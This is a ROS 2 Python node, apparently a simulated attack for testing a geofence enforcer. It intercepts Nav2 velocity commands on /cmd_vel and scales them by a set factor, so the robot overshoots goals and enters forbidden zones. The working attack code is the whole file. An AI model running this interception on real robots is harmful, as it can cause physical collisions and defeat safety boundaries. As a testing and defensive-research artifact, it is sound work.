#!/usr/bin/env python3
"""
Velocity Scaling Attack Node (S4 Attack)
=========================================

시뮬레이션된 공격: cmd_vel을 가로채서 속도를 스케일링합니다.

공격 시나리오:
- 사용자가 "3m 앞으로 가" 명령
- Nav2가 0.5m/s로 이동 명령 생성
- 이 공격 노드가 속도를 2배로 스케일링 (1.0m/s)
- 로봇이 예상보다 빨리 이동 → 목표를 지나침 → 금지구역 진입

사용법:
    ros2 run geofence_policy_enforcer attack_velocity_scaling --ros-args \
        -p scale_factor:=2.0 \
        -p input_topic:=/cmd_vel_nav \
        -p output_topic:=/cmd_vel \
        -p attack_duration:=10.0

토픽 설정:
    Nav2 → cmd_vel_nav → [이 노드] → cmd_vel → 로봇
"""

import rclpy
from rclpy.node import Node
from geometry_msgs.msg import Twist
from std_msgs.msg import Bool, Float64
import time


class VelocityScalingAttack(Node):
    """cmd_vel을 스케일링하는 공격 노드"""

    def __init__(self):
        super().__init__('velocity_scaling_attack')

        # 파라미터 선언
        self.declare_parameter('scale_factor', 2.0)  # 속도 배수
        self.declare_parameter('input_topic', '/cmd_vel_nav')  # Nav2 출력
        self.declare_parameter('output_topic', '/cmd_vel')  # 로봇 입력
        self.declare_parameter('attack_enabled', True)  # 공격 활성화
        self.declare_parameter('attack_duration', 0.0)  # 0 = 무제한
        self.declare_parameter('attack_delay', 0.0)  # 시작 전 대기 시간
        self.declare_parameter('scale_linear_only', False)  # 선형 속도만 스케일링
        self.declare_parameter('log_interval', 1.0)  # 로그 출력 간격

        # 파라미터 읽기
        self.scale_factor = self.get_parameter('scale_factor').value
        input_topic = self.get_parameter('input_topic').value
        output_topic = self.get_parameter('output_topic').value
        self.attack_enabled = self.get_parameter('attack_enabled').value
        self.attack_duration = self.get_parameter('attack_duration').value
        self.attack_delay = self.get_parameter('attack_delay').value
        self.scale_linear_only = self.get_parameter('scale_linear_only').value
        self.log_interval = self.get_parameter('log_interval').value

        # 상태 변수
        self.attack_start_time = None
        self.last_log_time = 0.0
        self.total_msgs = 0
        self.scaled_msgs = 0

        # Publisher/Subscriber
        self.cmd_vel_pub = self.create_publisher(Twist, output_topic, 10)
        self.cmd_vel_sub = self.create_subscription(
            Twist, input_topic, self.cmd_vel_callback, 10)

        # 공격 상태 publish (모니터링용)
        self.attack_status_pub = self.create_publisher(Bool, '/attack/velocity_scaling/active', 10)
        self.scale_factor_pub = self.create_publisher(Float64, '/attack/velocity_scaling/scale', 10)

        # 상태 타이머
        self.status_timer = self.create_timer(0.5, self.publish_status)

        # 시작 로그
        self.get_logger().warn('=' * 60)
        self.get_logger().warn('VELOCITY SCALING ATTACK NODE STARTED')
        self.get_logger().warn('=' * 60)
        self.get_logger().warn(f'  Scale factor: {self.scale_factor}x')
        self.get_logger().warn(f'  Input topic:  {input_topic}')
        self.get_logger().warn(f'  Output topic: {output_topic}')
        self.get_logger().warn(f'  Attack enabled: {self.attack_enabled}')
        if self.attack_duration > 0:
            self.get_logger().warn(f'  Attack duration: {self.attack_duration}s')
        if self.attack_delay > 0:
            self.get_logger().warn(f'  Attack delay: {self.attack_delay}s')
        self.get_logger().warn('=' * 60)

    def cmd_vel_callback(self, msg: Twist):
        """cmd_vel 메시지를 받아서 스케일링 후 전달"""
        self.total_msgs += 1
        current_time = time.time()

        # 공격 시작 시간 기록
        if self.attack_start_time is None:
            self.attack_start_time = current_time

        # 공격 조건 확인
        elapsed = current_time - self.attack_start_time
        attack_active = self.attack_enabled

        # 딜레이 체크
        if self.attack_delay > 0 and elapsed < self.attack_delay:
            attack_active = False

        # 지속 시간 체크
        if self.attack_duration > 0:
            attack_elapsed = elapsed - self.attack_delay
            if attack_elapsed > self.attack_duration:
                attack_active = False

        # 출력 메시지 생성
        out_msg = Twist()

        if attack_active:
            # 공격 활성: 속도 스케일링
            out_msg.linear.x = msg.linear.x * self.scale_factor
            out_msg.linear.y = msg.linear.y * self.scale_factor
            out_msg.linear.z = msg.linear.z * self.scale_factor

            if self.scale_linear_only:
                # 선형만 스케일링, 각속도는 원본
                out_msg.angular = msg.angular
            else:
                out_msg.angular.x = msg.angular.x * self.scale_factor
                out_msg.angular.y = msg.angular.y * self.scale_factor
                out_msg.angular.z = msg.angular.z * self.scale_factor

            self.scaled_msgs += 1

            # 주기적 로그
            if current_time - self.last_log_time > self.log_interval:
                if abs(msg.linear.x) > 0.01:  # 움직일 때만 로그
                    self.get_logger().warn(
                        f'[ATTACK] Scaling velocity: {msg.linear.x:.3f} → '
                        f'{out_msg.linear.x:.3f} m/s ({self.scale_factor}x)')
                self.last_log_time = current_time
        else:
            # 공격 비활성: 원본 그대로 전달
            out_msg = msg

        # 출력
        self.cmd_vel_pub.publish(out_msg)

    def publish_status(self):
        """공격 상태 publish"""
        # 현재 공격 활성 여부
        status_msg = Bool()
        status_msg.data = self.attack_enabled
        self.attack_status_pub.publish(status_msg)

        # 현재 스케일 팩터
        scale_msg = Float64()
        scale_msg.data = float(self.scale_factor) if self.attack_enabled else 1.0
        self.scale_factor_pub.publish(scale_msg)

    def set_scale_factor(self, scale: float):
        """스케일 팩터 동적 변경"""
        self.scale_factor = scale
        self.get_logger().warn(f'[ATTACK] Scale factor changed to {scale}x')

    def enable_attack(self, enabled: bool):
        """공격 활성화/비활성화"""
        self.attack_enabled = enabled
        if enabled:
            self.attack_start_time = time.time()  # 타이머 리셋
            self.get_logger().warn('[ATTACK] Velocity scaling ENABLED')
        else:
            self.get_logger().info('[ATTACK] Velocity scaling DISABLED')


def main(args=None):
    rclpy.init(args=args)
    node = VelocityScalingAttack()

    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        node.get_logger().info('Attack node shutting down...')
        node.get_logger().info(f'Stats: {node.scaled_msgs}/{node.total_msgs} messages scaled')
    finally:
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
